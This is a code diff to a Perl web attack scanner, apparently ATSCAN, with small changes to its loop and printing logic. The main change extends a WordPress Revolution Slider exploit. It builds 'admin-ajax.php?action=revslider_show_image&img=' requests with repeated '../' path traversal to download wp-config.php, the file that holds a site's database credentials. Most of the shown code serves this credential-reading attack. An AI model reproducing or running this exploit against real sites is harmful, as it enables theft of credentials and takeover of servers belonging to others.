@@ -430,8 +430,10 @@ my @ADFWPargs=("/wp-admin/admin-ajax.php?action=revslider_show_image&img=WP1",
 ############################################################################################################################################################################################
 my @ADFWP;
 for my $ADFWPargs(@ADFWPargs) {
-  if ($ADFWPargs=~/WP1/) { $ADFWPargs=~s/WP1/repeat(..\/-5)wp-config.php/; }
-  push @ADFWP, $ADFWPargs;
+  if ($ADFWPargs=~/WP1/) {
+    $ADFWPargs=~s/WP1/wp-config.php/; push @ADFWP, $ADFWPargs;
+    $ADFWPargs=~s/wp-config.php/repeat(..\/-5)wp-config.php/; push @ADFWP, $ADFWPargs; }
+  else{ push @ADFWP, $ADFWPargs; }
 }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
@@ -891,6 +893,7 @@ sub checkErrors {
   my $ERROR=join("|", @ERR);
   if ($html=~/$ERROR/) {
     my (@E1, @E2, @E3, @E4, @E5, @E6, @E7, @E8, @E9, @E10, @E11, @E12, @E13, @E14, @E15, @E16, @E17, @E18, @E19);
+    print $c[1]."    $ErrT[18] $c[4]$ErrT[24]\n";
     for my $ERR(@ERR) {
       if ($html=~/$ERR/g) {
         if (grep( /^$ERR$/, @V_LFI)) { push(@E1, $ERR); }
@@ -936,7 +939,7 @@ sub checkErrors {
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## PRINT HTML ERRORS
-sub printALLerrors { my ($ErrT, $E)=@_; print $c[1]."    $ErrT[18] $c[4]$ErrT[24]\n".$c[1]."$sp $c[4]$ErrT ".$c[10]."[$E]"; print "\n"; }
+sub printALLerrors { my ($ErrT, $E)=@_; print $c[1]."$sp $c[4]$ErrT ".$c[10]."[$E]"; print "\n"; }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## CHECK URL PARTS
@@ -1576,15 +1579,15 @@ sub getPArrScan{
 ## MOVE URL TO SCAN
 sub doScan {
   my ($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $post, $subdomain)=@_;
-  my $n=0;
   my ($i, $sl, $rangQ);
+  my $n=0;
   if ($URL1=~/rang\((\d+)\-(\d+)\)/) {
     my @rangQ=($1 .. $2);
     $URL1=~s/rang\((\d+)\-(\d+)\)/ ATSCAN /g;
     for $rangQ(@rangQ) { $n++; doBuild($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $rangQ, scalar(grep { defined $_} @rangQ), $n, $post, $subdomain); }
   }elsif ($URL1=~/repeat\((.*)\-(\d+)\)/) {
     $URL1=~s/repeat\((.*)\-(\d+)\)/ ATSCAN /g;
-    for($i=0;$i<=$2;$i++) { $n++; $sl="$1" x $i; doBuild($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $sl, $2, $n, $post, $subdomain); points();}
+    for($i=1;$i<=$2;$i++) { $n++; $sl="$1" x $i; doBuild($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $sl, $2, $n, $post, $subdomain); points();}
   }else{
     buildPrint($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $post, $subdomain);
   }
@@ -1598,7 +1601,6 @@ sub doBuild {
   my $PURL1=$URL1;
   print $c[1]."    URL    $c[10] [$n/$nn] $PURL1\n";
   buildPrint($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $post, $subdomain);
-  stak() if $nn==$n and !defined $exploit;
 }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
